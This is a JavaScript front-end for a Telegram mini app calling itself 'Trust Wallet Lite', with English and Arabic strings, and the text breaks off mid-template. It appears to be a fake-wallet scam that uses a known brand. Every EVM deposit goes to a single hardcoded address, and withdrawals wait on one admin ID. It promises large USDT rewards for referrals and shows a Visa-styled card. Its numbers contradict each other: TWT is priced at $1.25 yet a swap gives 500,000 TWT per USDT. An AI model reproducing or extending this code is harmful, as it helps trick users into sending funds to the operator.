// ============================================================================
// TRUST WALLET LITE - COMPLETE VERSION (REFI STYLE - PURE BACKEND)
// ============================================================================

// ====== 1. TELEGRAM WEBAPP INITIALIZATION (مثل REFI) ======
const tg = window.Telegram?.WebApp;
if (tg) {
    tg.ready();
    tg.expand();
    tg.enableClosingConfirmation?.();
    console.log("✅ Telegram WebApp initialized");
}

// 🔥 السطر السحري من REFI - لا تغيره أبداً 🔥
const userId = tg?.initDataUnsafe?.user?.id?.toString() || 
               localStorage.getItem('twt_user_id') || 
               'guest_' + Math.random().toString(36).substr(2, 9);

const userName = tg?.initDataUnsafe?.user?.first_name || 'TWT User';
const userFirstName = tg?.initDataUnsafe?.user?.first_name || 'User';
const userLastName = tg?.initDataUnsafe?.user?.last_name || '';
const userUsername = tg?.initDataUnsafe?.user?.username || '';
const userPhoto = tg?.initDataUnsafe?.user?.photo_url || '';

// حفظ معرف المستخدم
localStorage.setItem('twt_user_id', userId);

console.log("📱 User ID:", userId);
console.log("👤 Name:", userName);
console.log("🔹 Username:", userUsername);

// استخراج start_param (للإحالات)
const startParam = tg?.initDataUnsafe?.start_param || 
                   new URLSearchParams(window.location.search).get('startapp') || 
                   new URLSearchParams(window.location.search).get('ref');

// ====== 2. TRANSLATION SYSTEM (i18n) - مثل REFI ======
const translations = {
    en: {
        'app.name': 'Trust Wallet Lite',
        'welcome.title': 'Welcome back,',
        'nav.wallet': 'Wallet',
        'nav.swap': 'Swap',
        'nav.airdrop': 'Airdrop',
        'nav.twtpay': 'TWT Pay',
        'nav.settings': 'Settings',
        'actions.deposit': 'Deposit',
        'actions.withdraw': 'Withdraw',
        'actions.history': 'History',
        'actions.p2p': 'P2P',
        'actions.seeAll': 'See All',
        'actions.confirmSwap': 'Confirm Swap',
        'actions.copy': 'Copy',
        'actions.gotIt': 'Got it!',
        'wallet.totalBalance': 'Total Balance',
        'wallet.myAssets': 'My Assets',
        'wallet.topCryptos': 'Top Cryptocurrencies',
        'swap.from': 'From',
        'swap.to': 'To',
        'swap.exchangeRate': 'Exchange Rate',
        'swap.networkFee': 'Network Fee',
        'swap.free': '0 BNB (FREE)',
        'airdrop.title': 'EARN USDT',
        'airdrop.totalInvites': 'TOTAL INVITES',
        'airdrop.earned': 'USDT EARNED',
        'airdrop.yourLink': 'Your Invite Link',
        'airdrop.description': 'Share your link and get',
        'airdrop.description2': 'for every friend who joins. Complete milestones to earn massive USDT rewards!',
        'airdrop.milestones': 'Airdrop Milestones',
        'deposit.title': 'Deposit Funds',
        'deposit.selectCurrency': 'Select Currency',
        'deposit.amount': 'Amount',
        'deposit.transactionId': 'Transaction ID',
        'deposit.sendTo': 'Send to this address:',
        'deposit.confirmation': '✓ Blockchain confirmation 1-5 minutes',
        'deposit.submit': 'Submit Deposit',
        'withdraw.title': 'Withdraw Funds',
        'withdraw.selectCurrency': 'Select Currency',
        'withdraw.amount': 'Amount',
        'withdraw.address': 'Wallet Address',
        'withdraw.youReceive': 'You will receive:',
        'withdraw.networkFee': 'Network fee:',
        'withdraw.submit': 'Submit Withdrawal',
        'history.title': 'Transaction History',
        'history.all': 'All',
        'history.deposits': 'Deposits',
        'history.withdrawals': 'Withdrawals',
        'history.swaps': 'Swaps',
        'history.referrals': 'Referrals',
        'notifications.title': 'Notifications',
        'currency.select': 'Select Currency',
        'p2p.comingSoon': 'Coming Soon!',
        'p2p.description': 'We\'re working hard to bring you the best P2P trading experience.',
        'p2p.launching': 'Launching in:',
        'messages.loading': 'Loading prices...',
        'messages.loadingHistory': 'Loading history...',
        'messages.success': 'Success',
        'messages.error': 'Error',
        'messages.warning': 'Warning',
        'messages.info': 'Info',
        'notif.depositApproved': '✅ Your deposit of {amount} {currency} has been approved!',
        'notif.depositRejected': '❌ Your deposit was rejected. Reason: {reason}',
        'notif.withdrawApproved': '✅ Your withdrawal of {amount} USDT has been approved!',
        'notif.withdrawRejected': '❌ Your withdrawal was rejected. Reason: {reason}',
        'notif.referralBonus': '🎉 Someone joined with your link! You got 25 USDT!',
        'notif.welcomeBonus': '🎉 Welcome! You got 10 USDT bonus!',
        'error.minDeposit': 'Minimum deposit is {min} {currency}',
        'error.invalidHash': 'Invalid transaction hash. Must start with 0x and be 66 characters',
        'error.hashUsed': 'This transaction hash has already been used',
        'error.insufficientBalance': 'Insufficient {currency} balance',
        'error.minSwap': 'Minimum swap is {min} {currency}',
        'error.enterAmount': 'Please enter a valid amount',
        'success.depositSubmitted': '✅ Deposit request submitted for review! Amount: {amount} {currency}',
        'success.withdrawSubmitted': '✅ Withdrawal request submitted for {amount} USDT',
        'success.swapCompleted': '✅ Swapped {fromAmount} {fromCurrency} to {toAmount} {toCurrency}',
        'success.referralCopied': '✅ Referral link copied!',
        'success.addressCopied': '✅ Address copied to clipboard!',
        'notifications.clear_read': 'Clear Read',
        'notifications.clear_all': 'Clear All',
        'notifications.confirm_clear_read': 'Clear {count} read notification(s)? {unread} unread will remain.',
        'notifications.confirm_clear_all': 'Delete all notifications?',
        'notifications.cleared': 'Cleared {count} read notifications',
        'notifications.no_read': 'No read notifications to clear',
        'notifications.no_notifications': 'No notifications'
    },
    ar: {
        'app.name': 'Trust Wallet Lite',
        'welcome.title': 'أهلاً بعودتك،',
        'nav.wallet': 'المحفظة',
        'nav.swap': 'تحويل',
        'nav.airdrop': 'الإسقاط الجوي',
        'nav.twtpay': 'TWT Pay',
        'nav.settings': 'الإعدادات',
        'actions.deposit': 'إيداع',
        'actions.withdraw': 'سحب',
        'actions.history': 'السجل',
        'actions.p2p': 'P2P',
        'actions.seeAll': 'عرض الكل',
        'actions.confirmSwap': 'تأكيد التحويل',
        'actions.copy': 'نسخ',
        'actions.gotIt': 'حسناً!',
        'wallet.totalBalance': 'الرصيد الإجمالي',
        'wallet.myAssets': 'أصولي',
        'wallet.topCryptos': 'أفضل العملات',
        'swap.from': 'من',
        'swap.to': 'إلى',
        'swap.exchangeRate': 'سعر الصرف',
        'swap.networkFee': 'رسوم الشبكة',
        'swap.free': '0 BNB (مجاناً)',
        'airdrop.title': 'اربح USDT',
        'airdrop.totalInvites': 'إجمالي الدعوات',
        'airdrop.earned': 'USDT المكتسبة',
        'airdrop.yourLink': 'رابط الدعوة',
        'airdrop.description': 'شارك رابطك واحصل على',
        'airdrop.description2': 'لكل صديق ينضم. أكمل المراحل لتربح مكافآت USDT ضخمة!',
        'airdrop.milestones': 'مراحل الإسقاط',
        'deposit.title': 'إيداع الأموال',
        'deposit.selectCurrency': 'اختر العملة',
        'deposit.amount': 'المبلغ',
        'deposit.transactionId': 'رقم المعاملة',
        'deposit.sendTo': 'أرسل إلى هذا العنوان:',
        'deposit.confirmation': '✓ تأكيد البلوكشين 1-5 دقائق',
        'deposit.submit': 'تقديم الإيداع',
        'withdraw.title': 'سحب الأموال',
        'withdraw.selectCurrency': 'اختر العملة',
        'withdraw.amount': 'المبلغ',
        'withdraw.address': 'عنوان المحفظة',
        'withdraw.youReceive': 'سوف تستلم:',
        'withdraw.networkFee': 'رسوم الشبكة:',
        'withdraw.submit': 'تقديم السحب',
        'history.title': 'سجل المعاملات',
        'history.all': 'الكل',
        'history.deposits': 'إيداعات',
        'history.withdrawals': 'سحوبات',
        'history.swaps': 'تحويلات',
        'history.referrals': 'إحالات',
        'notifications.title': 'الإشعارات',
        'currency.select': 'اختر العملة',
        'p2p.comingSoon': 'قريباً!',
        'p2p.description': 'نحن نعمل بجد لنقدم لك أفضل تجربة تداول P2P.',
        'p2p.launching': 'الإطلاق خلال:',
        'messages.loading': 'جاري تحميل الأسعار...',
        'messages.loadingHistory': 'جاري تحميل السجل...',
        'messages.success': 'نجاح',
        'messages.error': 'خطأ',
        'messages.warning': 'تحذير',
        'messages.info': 'معلومات',
        'notif.depositApproved': '✅ تمت الموافقة على إيداعك {amount} {currency}!',
        'notif.depositRejected': '❌ تم رفض إيداعك. السبب: {reason}',
        'notif.withdrawApproved': '✅ تمت الموافقة على سحبك {amount} USDT!',
        'notif.withdrawRejected': '❌ تم رفض سحبك. السبب: {reason}',
        'notif.referralBonus': '🎉 شخص ما انضم عبر رابطك! حصلت على 25 USDT!',
        'notif.welcomeBonus': '🎉 مرحباً! حصلت على 10 USDT كمكافأة!',
        'error.minDeposit': 'الحد الأدنى للإيداع هو {min} {currency}',
        'error.invalidHash': 'هاش معاملة غير صالح. يجب أن يبدأ بـ 0x وأن يكون 66 حرفاً',
        'error.hashUsed': 'هذا الهاش مستخدم بالفعل',
        'error.insufficientBalance': 'رصيد {currency} غير كافٍ',
        'error.minSwap': 'الحد الأدنى للتحويل هو {min} {currency}',
        'error.enterAmount': 'الرجاء إدخال مبلغ صحيح',
        'success.depositSubmitted': '✅ تم تقديم طلب الإيداع للمراجعة! المبلغ: {amount} {currency}',
        'success.withdrawSubmitted': '✅ تم تقديم طلب السحب بمبلغ {amount} USDT',
        'success.swapCompleted': '✅ تم تحويل {fromAmount} {fromCurrency} إلى {toAmount} {toCurrency}',
        'success.referralCopied': '✅ تم نسخ رابط الإحالة!',
        'success.addressCopied': '✅ تم نسخ العنوان إلى الحافظة!',
        'notifications.clear_read': 'حذف المقروء',
        'notifications.clear_all': 'حذف الكل',
        'notifications.confirm_clear_read': 'حذف {count} إشعار مقروء؟ سيبقى {unread} إشعار غير مقروء.',
        'notifications.confirm_clear_all': 'حذف جميع الإشعارات؟',
        'notifications.cleared': 'تم حذف {count} إشعار مقروء',
        'notifications.no_read': 'لا توجد إشعارات مقروءة للحذف',
        'notifications.no_notifications': 'لا توجد إشعارات'
    }
};

// اللغة الحالية
let currentLanguage = localStorage.getItem('preferred_language') || 'en';
let currentTheme = localStorage.getItem('theme') || 'light';
let currentPage = 'wallet';

// دالة الترجمة
function t(key, params = {}) {
    let text = translations[currentLanguage]?.[key] || translations.en[key] || key;
    Object.keys(params).forEach(param => {
        text = text.replace(`{${param}}`, params[param]);
    });
    return text;
}

function toggleLanguage() {
    currentLanguage = currentLanguage === 'en' ? 'ar' : 'en';
    localStorage.setItem('preferred_language', currentLanguage);
    const flagEl = document.getElementById('currentLanguageFlag');
    if (flagEl) flagEl.textContent = currentLanguage === 'en' ? '🇬🇧' : '🇸🇦';
    if (currentLanguage === 'ar') {
        document.body.classList.add('rtl');
        document.documentElement.dir = 'rtl';
    } else {
        document.body.classList.remove('rtl');
        document.documentElement.dir = 'ltr';
    }
    updateAllTexts();
    showToast(t('messages.success'), 'success');
}

function updateAllTexts() {
    document.querySelectorAll('[data-i18n]').forEach(el => {
        const key = el.getAttribute('data-i18n');
        el.textContent = t(key);
    });
}

function toggleTheme() {
    currentTheme = currentTheme === 'light' ? 'dark' : 'light';
    localStorage.setItem('theme', currentTheme);
    document.documentElement.setAttribute('data-theme', currentTheme);
    const themeIcon = document.querySelector('#themeBtn i');
    if (themeIcon) themeIcon.className = currentTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
}

function initTheme() {
    document.documentElement.setAttribute('data-theme', currentTheme);
    const themeIcon = document.querySelector('#themeBtn i');
    if (themeIcon) themeIcon.className = currentTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
}

// ====== 3. ICONS & CONSTANTS ======
const CMC_ICONS = {
    TWT: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5964.png',
    USDT: 'https://s2.coinmarketcap.com/static/img/coins/64x64/825.png',
    BNB: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png',
    BTC: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1.png',
    ETH: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png',
    SOL: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5426.png',
    TRX: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1958.png',
    ADA: 'https://s2.coinmarketcap.com/static/img/coins/64x64/2010.png',
    DOGE: 'https://s2.coinmarketcap.com/static/img/coins/64x64/74.png',
    SHIB: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5994.png',
    PEPE: 'https://s2.coinmarketcap.com/static/img/coins/64x64/24478.png',
    TON: 'https://s2.coinmarketcap.com/static/img/coins/64x64/11419.png'
};

const BOT_LINK = "https://t.me/TrustTgWalletbot/TWT";
const ADMIN_ID = "1653918641";
const AIRDROP_BONUS = 10;
const REFERRAL_BONUS = 25;
const TWT_PRICE = 1.25;
const SWAP_RATE = 500000; // 1 USDT = 500,000 TWT

// معرفات العملات في CoinGecko
const CRYPTO_IDS = {
    BTC: 'bitcoin',
    ETH: 'ethereum',
    BNB: 'binancecoin',
    USDT: 'tether',
    SOL: 'solana',
    TON: 'the-open-network',
    ADA: 'cardano',
    DOGE: 'dogecoin',
    SHIB: 'shiba-inu',
    PEPE: 'pepe',
    TRX: 'tron'
};

// قائمة العملات للعرض
const TOP_CRYPTOS = [
    { symbol: 'BTC', name: 'Bitcoin' },
    { symbol: 'ETH', name: 'Ethereum' },
    { symbol: 'BNB', name: 'Binance Coin' },
    { symbol: 'TWT', name: 'Trust Wallet Token' },
    { symbol: 'SOL', name: 'Solana' },
    { symbol: 'TRX', name: 'TRON' },
    { symbol: 'SHIB', name: 'Shiba Inu' },
    { symbol: 'PEPE', name: 'Pepe' },
    { symbol: 'ADA', name: 'Cardano' },
    { symbol: 'DOGE', name: 'Dogecoin' },
    { symbol: 'TON', name: 'Toncoin' }
];

// جميع الأصول
const ALL_ASSETS = [
    { symbol: 'TWT', name: 'Trust Wallet Token' },
    { symbol: 'USDT', name: 'Tether' },
    { symbol: 'BNB', name: 'BNB' },
    { symbol: 'BTC', name: 'Bitcoin' },
    { symbol: 'ETH', name: 'Ethereum' },
    { symbol: 'SHIB', name: 'Shiba Inu' },
    { symbol: 'PEPE', name: 'Pepe' },
    { symbol: 'SOL', name: 'Solana' },
    { symbol: 'TRX', name: 'TRON' },
    { symbol: 'ADA', name: 'Cardano' },
    { symbol: 'DOGE', name: 'Dogecoin' },
    { symbol: 'TON', name: 'Toncoin' }
];

// مهام الإحالة
const REFERRAL_MILESTONES = [
    { referrals: 10, reward: 50, unit: 'USDT', icon: 'fa-medal' },
    { referrals: 25, reward: 120, unit: 'USDT', icon: 'fa-medal' },
    { referrals: 50, reward: 250, unit: 'USDT', icon: 'fa-crown' },
    { referrals: 100, reward: 500, unit: 'USDT', icon: 'fa-crown' },
    { referrals: 250, reward: 1000, unit: 'USDT', icon: 'fa-gem' }
];

// عناوين الإيداع والحدود الدنيا
const DEPOSIT_ADDRESSES = {
    TWT: '0xbf70420f57342c6Bd4267430D4D3b7E946f09450',
    USDT: '0xbf70420f57342c6Bd4267430D4D3b7E946f09450',
    BNB: '0xbf70420f57342c6Bd4267430D4D3b7E946f09450',
    ETH: '0xbf70420f57342c6Bd4267430D4D3b7E946f09450',
    SHIB: '0xbf70420f57342c6Bd4267430D4D3b7E946f09450',
    PEPE: '0xbf70420f57342c6Bd4267430D4D3b7E946f09450',
    SOL: '3DjcSVxfeP3u4WcV9KniMH11btgThnoGxcx54dMtbfuR',
    TRX: 'TMSJH4QunFiUAqZ8iLvQDPajs1v4B3e5E6'
};

const DEPOSIT_MINIMUMS = {
    TWT: 500000,
    USDT: 10,
    BNB: 0.02,
    ETH: 0.005,
    SHIB: 2000000,
    PEPE: 3000000,
    SOL: 0.12,
    TRX: 40
};

const DEPOSIT_NOTES = {
    TWT: '✓ Blockchain confirmation 1-15 minutes',
    USDT: '✓ Blockchain confirmation 1-15 minutes',
    BNB: '✓ Blockchain confirmation 1-15 minutes',
    ETH: '✓ Blockchain confirmation 1-15 minutes',
    SHIB: '✓ Blockchain confirmation 1-15 minutes',
    PEPE: '✓ Blockchain confirmation 1-15 minutes',
    SOL: '✓ Blockchain confirmation 1-15 minutes',
    TRX: '✓ Blockchain confirmation 1-15 minutes'
};

// ====== 4. STATE MANAGEMENT ======
let userData = null;
let livePrices = {};
let unreadNotifications = 0;
let appInitialized = false;
let isAdmin = userId === ADMIN_ID;

// متغيرات لتتبع وقت آخر تحميل
let lastUserLoadTime = 0;
let lastPricesLoadTime = 0;
let lastHistoryCheckTime = 0;
const USER_CACHE_TIME = 300000; // 5 دقائق
const PRICES_CACHE_TIME = 10800000; // 3 ساعات
const HISTORY_CACHE_TIME = 600000; // 10 دقائق

// ====== 5. STICKER SYSTEM ======
const WELCOME_STICKERS = ['🐸', '🫅', '🥰', '🥳', '💲', '💰', '💸', '💵', '🤪', '😱', '😤', '😎', '🤑', '💯', '💖', '👑', '❤️‍🔥', '🫂', '🔥', '🧡', '🤑', '🧟', '🎁', '💌', '🎉', '❤️‍🔥', '👑', '🚀', '💟', '🤍'];

let lastStickerTime = 0;
const STICKER_COOLDOWN = 12 * 60 * 1000;

function showRandomSticker() {
    const now = Date.now();
    if (now - lastStickerTime < STICKER_COOLDOWN) return;
    const stickerElement = document.getElementById('welcomeSticker');
    if (!stickerElement) return;
    const randomSticker = WELCOME_STICKERS[Math.floor(Math.random() * WELCOME_STICKERS.length)];
    stickerElement.textContent = randomSticker;
    stickerElement.classList.remove('sticker-pop', 'sticker-shake');
    void stickerElement.offsetWidth;
    stickerElement.classList.add('sticker-pop');
    setTimeout(() => stickerElement.classList.add('sticker-shake'), 200);
    setTimeout(() => {
        stickerElement.classList.remove('sticker-pop', 'sticker-shake');
        setTimeout(() => stickerElement.textContent = '', 300);
    }, 3000);
    lastStickerTime = now;
    console.log('🎨 Welcome sticker displayed:', randomSticker);
}

// ====== 6. ADMIN SYSTEM ======
function checkAdminAndAddCrown() {
    if (!isAdmin) return;
    
    const addCrown = () => {
        const header = document.querySelector('.header-actions');
        if (!header) return false;
        
        const existingCrown = document.getElementById('adminCrownBtn');
        if (existingCrown) existingCrown.remove();
        
        const adminBtn = document.createElement('button');
        adminBtn.id = 'adminCrownBtn';
        adminBtn.className = 'icon-btn';
        adminBtn.innerHTML = '<i class="fa-solid fa-crown" style="color: gold;"></i>';
        adminBtn.onclick = showAdminPanel;
        adminBtn.title = 'Admin Panel';
        
        const notifBtn = document.getElementById('notificationBtn');
        if (notifBtn) {
            header.insertBefore(adminBtn, notifBtn);
        } else {
            header.appendChild(adminBtn);
        }
        
        return true;
    };
    
    if (!addCrown()) {
        setTimeout(addCrown, 500);
    }
}

// ====== 7. API CALLS (PURE BACKEND - NO DIRECT FIREBASE) ======
async function apiCall(endpoint, method = 'GET', body = null) {
    const options = { method, headers: { 'Content-Type': 'application/json' } };
    if (body) options.body = JSON.stringify(body);
    const response = await fetch(`/api${endpoint}`, options);
    return response.json();
}

// ====== 8. ON-DEMAND LISTENERS (VIA BACKEND POLLING) ======
let activeListeners = new Map();
let listenerTimeouts = new Map();

function startOnDemandListener(collection, docId, callback, timeoutMs = 30000) {
    const listenerId = `${collection}_${docId}`;
    
    if (activeListeners.has(listenerId)) {
        clearTimeout(activeListeners.get(listenerId));
        activeListeners.delete(listenerId);
    }
    
    console.log(`👂 Starting on-demand polling for ${listenerId} (${timeoutMs/1000}s)`);
    
    const poll = async () => {
        try {
            const response = await apiCall(`/${collection}/${docId}`);
            if (response.success && response.data) {
                callback(response.data);
                if (response.data.status === 'approved' || response.data.status === 'rejected') {
                    console.log(`✅ Final status reached, stopping polling`);
                    stopOnDemandListener(listenerId);
                    return;
                }
            }
        } catch (error) {
            console.error(`❌ Polling error:`, error);
        }
        
        const timeout = setTimeout(poll, 5000);
        activeListeners.set(listenerId, timeout);
    };
    
    poll();
    
    const timeout = setTimeout(() => {
        console.log(`⏰ Polling timeout after ${timeoutMs/1000}s`);
        stopOnDemandListener(listenerId);
    }, timeoutMs);
    
    listenerTimeouts.set(listenerId, timeout);
}

function stopOnDemandListener(listenerId) {
    if (activeListeners.has(listenerId)) {
        clearTimeout(activeListeners.get(listenerId));
        activeListeners.delete(listenerId);
    }
    if (listenerTimeouts.has(listenerId)) {
        clearTimeout(listenerTimeouts.get(listenerId));
        listenerTimeouts.delete(listenerId);
    }
}

function stopAllListeners() {
    activeListeners.forEach(timeout => clearTimeout(timeout));
    listenerTimeouts.forEach(timeout => clearTimeout(timeout));
    activeListeners.clear();
    listenerTimeouts.clear();
}

// ====== 9. TRANSACTIONS STORAGE ======
const TRANSACTIONS_KEY = `transactions_${userId}`;

function loadLocalTransactions() {
    try {
        const saved = localStorage.getItem(TRANSACTIONS_KEY);
        return saved ? JSON.parse(saved) : [];
    } catch (error) {
        console.error("Error loading transactions:", error);
        return [];
    }
}

function saveLocalTransactions(transactions) {
    try {
        localStorage.setItem(TRANSACTIONS_KEY, JSON.stringify(transactions));
    } catch (error) {
        console.error("Error saving transactions:", error);
    }
}

function addTransaction(transaction) {
    try {
        const allTransactions = loadLocalTransactions();
        
        const exists = allTransactions.some(t => 
            (t.firebaseId && t.firebaseId === transaction.firebaseId) ||
            (t.timestamp === transaction.timestamp && t.type === transaction.type && t.amount === transaction.amount)
        );
        
        if (exists) {
            console.log("⏭️ Transaction already exists, skipping...");
            return false;
        }
        
        if (!userData.transactions) userData.transactions = [];
        userData.transactions.unshift(transaction);
        
        allTransactions.unshift(transaction);
        saveLocalTransactions(allTransactions);
        
        localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
        
        if (currentPage === 'history' || document.getElementById('historyModal')?.classList.contains('show')) {
            renderHistory(currentHistoryFilter);
        }
        
        console.log("✅ Transaction added successfully");
        return true;
    } catch (error) {
        console.error("❌ Error in addTransaction:", error);
        return false;
    }
}

// ====== 10. PRICES ======
async function fetchLivePrices(force = false) {
    const now = Date.now();
    const cachedPrices = localStorage.getItem('live_prices');
    
    if (!force && cachedPrices && (now - lastPricesLoadTime) < PRICES_CACHE_TIME) {
        const { prices, timestamp } = JSON.parse(cachedPrices);
        livePrices = prices;
        lastPricesLoadTime = timestamp;
        console.log("📦 Using cached prices (less than 3 hours old)");
        updatePrices();
        return;
    }
    
    try {
        const ids = Object.values(CRYPTO_IDS).join(',');
        const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd&include_24hr_change=true`);
        const data = await response.json();
        
        for (const [symbol, id] of Object.entries(CRYPTO_IDS)) {
            if (data[id]) {
                livePrices[symbol] = {
                    price: data[id].usd,
                    change: data[id].usd_24h_change || 0
                };
            }
        }
        
        if (!livePrices.TWT) livePrices.TWT = { price: TWT_PRICE, change: 0 };
        
        lastPricesLoadTime = now;
        localStorage.setItem('live_prices', JSON.stringify({ prices: livePrices, timestamp: now }));
        
        updatePrices();
    } catch (error) {
        console.error("Error fetching prices:", error);
    }
}

function updatePrices() {
    renderTopCryptos();
    renderAssets();
    updateTotalBalance();
}

function refreshPrices() {
    animateElement('.refresh-btn', 'pop');
    fetchLivePrices(true);
    showToast(t('messages.success'), 'success');
}

// ====== 11. RENDER FUNCTIONS ======
function renderTopCryptos() {
    const topCryptoList = document.getElementById('topCryptoList');
    if (!topCryptoList) return;
    
    if (Object.keys(livePrices).length === 0) {
        topCryptoList.innerHTML = '<div class="loading-spinner"><i class="fa-solid fa-spinner fa-spin-pulse"></i> ' + t('messages.loading') + '</div>';
        return;
    }
    
    topCryptoList.innerHTML = TOP_CRYPTOS.map(crypto => {
        let priceData = livePrices[crypto.symbol] || { price: 0, change: 0 };
        if (crypto.symbol === 'TWT') priceData = { price: TWT_PRICE, change: 0 };
        
        const changeClass = priceData.change >= 0 ? 'positive' : 'negative';
        const changeSymbol = priceData.change >= 0 ? '+' : '';
        
        return `
            <div class="crypto-item" onclick="showCryptoDetails('${crypto.symbol}')">
                <div class="crypto-left">
                    <img src="${getCurrencyIcon(crypto.symbol)}" class="crypto-icon-img" alt="${crypto.symbol}">
                    <div class="crypto-info">
                        <h4>${crypto.name}</h4>
                        <p>${crypto.symbol}</p>
                    </div>
                </div>
                <div class="crypto-right">
                    <div class="crypto-price">$${formatNumber(priceData.price)}</div>
                    <div class="crypto-change ${changeClass}">${changeSymbol}${priceData.change.toFixed(2)}%</div>
                </div>
            </div>
        `;
    }).join('');
}

function renderAssets() {
    const assetsList = document.getElementById('assetsList');
    if (!assetsList || !userData) return;
    
    const sortedAssets = [...ALL_ASSETS].sort((a, b) => {
        if (a.symbol === 'TWT') return -1;
        if (b.symbol === 'TWT') return 1;
        const aBalance = userData.balances[a.symbol] || 0;
        const bBalance = userData.balances[b.symbol] || 0;
        return bBalance - aBalance;
    });
    
    assetsList.innerHTML = sortedAssets.map(asset => {
        const balance = userData.balances[asset.symbol] || 0;
        const price = livePrices[asset.symbol]?.price || (asset.symbol === 'TWT' ? TWT_PRICE : 0);
        const value = asset.symbol === 'USDT' ? balance : balance * price;
        const change = livePrices[asset.symbol]?.change || 0;
        const changeClass = change >= 0 ? 'positive' : 'negative';
        const changeSymbol = change >= 0 ? '+' : '';
        
        return `
            <div class="asset-item" onclick="showAssetDetails('${asset.symbol}')">
                <div class="asset-left">
                    <img src="${getCurrencyIcon(asset.symbol)}" class="asset-icon-img" alt="${asset.symbol}">
                    <div class="asset-info">
                        <h4>${asset.name}</h4>
                        <p>${asset.symbol} <span class="asset-change ${changeClass}">${changeSymbol}${change.toFixed(2)}%</span></p>
                    </div>
                </div>
                <div class="asset-right">
                    <div class="asset-balance">${formatBalance(balance, asset.symbol)}</div>
                    <div class="asset-value">$${formatNumber(value)}</div>
                </div>
            </div>
        `;
    }).join('');
}

function renderWallet() {
    const container = document.getElementById('walletContainer');
    if (!container) return;
    
    container.innerHTML = `
        <div class="balance-card">
            <div class="total-balance" id="totalBalance">$0</div>
        </div>
        <div class="action-buttons">
            <button class="action-btn" onclick="showDepositModal()"><i class="fas fa-plus-circle"></i><span>${t('actions.deposit')}</span></button>
            <button class="action-btn" onclick="showWithdrawModal()"><i class="fas fa-minus-circle"></i><span>${t('actions.withdraw')}</span></button>
            <button class="action-btn" onclick="showSendModal()"><i class="fas fa-paper-plane"></i><span>${t('actions.send')}</span></button>
            <button class="action-btn" onclick="showReceiveModal()"><i class="fas fa-qrcode"></i><span>${t('actions.receive')}</span></button>
            <button class="action-btn" onclick="showHistory()"><i class="fas fa-history"></i><span>${t('actions.history')}</span></button>
        </div>
        <div id="assetsList" class="assets-list"></div>
    `;
    renderAssets();
    updateTotalBalance();
}

function renderAirdrop() {
    const container = document.getElementById('referralContainer');
    if (!container || !userData) return;
    
    const inviteLink = `${BOT_LINK}?startapp=${userData.referralCode || userId}`;
    
    container.innerHTML = `
        <div class="referral-stats">
            <div class="stat-card"><span>${t('airdrop.totalInvites')}</span><span id="totalInvites">${userData.inviteCount || 0}</span></div>
            <div class="stat-card"><span>${t('airdrop.earned')}</span><span id="usdtEarned">${(userData.totalUsdtEarned || 0).toFixed(2)}</span></div>
        </div>
        <div class="referral-link-card">
            <div class="link-label">${t('airdrop.yourLink')}</div>
            <div class="link-container">
                <input type="text" id="inviteLink" value="${inviteLink}" readonly>
                <button class="copy-btn" onclick="copyInviteLink()"><i class="fas fa-copy"></i></button>
                <button class="share-btn" onclick="shareReferral()"><i class="fas fa-share-alt"></i></button>
            </div>
        </div>
        <div class="referral-description"><i class="fas fa-gift"></i><p>${t('airdrop.description')} <strong>${REFERRAL_BONUS} USDT</strong> ${t('airdrop.description2')}</p></div>
        <div class="section-header"><h3>${t('airdrop.milestones')}</h3></div>
        <div id="milestonesList" class="milestones-list"></div>
    `;
    
    renderAirdropMilestones();
}

function renderAirdropMilestones() {
    const container = document.getElementById('milestonesList');
    if (!container || !userData) return;
    
    container.innerHTML = REFERRAL_MILESTONES.map(milestone => {
        const progress = Math.min((userData.inviteCount / milestone.referrals) * 100, 100);
        const canClaim = userData.inviteCount >= milestone.referrals && !userData.referralMilestones?.find(m => m.referrals === milestone.referrals)?.claimed;
        const isClaimed = userData.referralMilestones?.find(m => m.referrals === milestone.referrals)?.claimed;
        
        return `
            <div class="milestone-item">
                <div class="milestone-header">
                    <span class="milestone-referrals">
                        <i class="fa-regular ${milestone.icon}"></i>
                        ${milestone.referrals} Referrals
                    </span>
                    <span class="milestone-reward">${milestone.reward} ${milestone.unit}</span>
                </div>
                <div class="milestone-progress">
                    <div class="progress-bar">
                        <div class="progress-fill" style="width: ${progress}%"></div>
                    </div>
                    <span class="progress-text">${userData.inviteCount}/${milestone.referrals}</span>
                </div>
                ${canClaim ? `<button class="claim-btn" onclick="claimReferralMilestone(${milestone.referrals})" style="margin-top: 10px; width: 100%;">Claim Reward</button>` : isClaimed ? '<p style="color: var(--success); text-align: center; margin-top: 10px;">✓ Claimed</p>' : ''}
            </div>
        `;
    }).join('');
}

function renderTWTPay() {
    const container = document.getElementById('twtpayContainer');
    if (!container) return;
    const twtBalance = userData?.balances?.TWT || 0;
    const cardNumber = userId?.slice(-4) || '8888';
    container.innerHTML = `
        <div class="virtual-card">
            <div class="card-chip"><i class="fas fa-microchip"></i></div>
            <div class="card-brand">TWT Pay</div>
            <div class="card-number"><span>****</span><span>****</span><span>****</span><span>${cardNumber}</span></div>
            <div class="card-details"><div><div class="label">Card Holder</div><div class="value">${userData?.userName || 'User'}</div></div><div><div class="label">Expires</div><div class="value">12/28</div></div></div>
            <div class="card-balance"><div class="balance-label">Card Balance</div><div class="balance-value">${twtBalance} TWT</div><div class="balance-usd">≈ $${(twtBalance * TWT_PRICE).toFixed(2)}</div></div>
            <div class="card-footer"><i class="fab fa-visa"></i><span>Virtual Card</span></div>
        </div>
        <div class="card-actions">
            <button class="card-action-btn" onclick="showTopUp()"><i class="fas fa-plus-circle"></i><span>Top Up</span></button>
            <button class="card-action-btn" onclick="showCardSettings()"><i class="fas fa-sliders-h"></i><span>Settings</span></button>
            <button class="card-action-btn" onclick="showCardTransactions()"><i class="fas fa-history"></i><span>History</span></button>
        </div>
        <div class="card-features">
            <div class="feature"><i class="fas fa-globe"></i><span>Global</span></div>
            <div class="feature"><i class="fas fa-shield-alt"></i><span>Secure</span></div>
            <div class="feature"><i class="fas fa-percent"></i><span>2% Cashback</span></div>
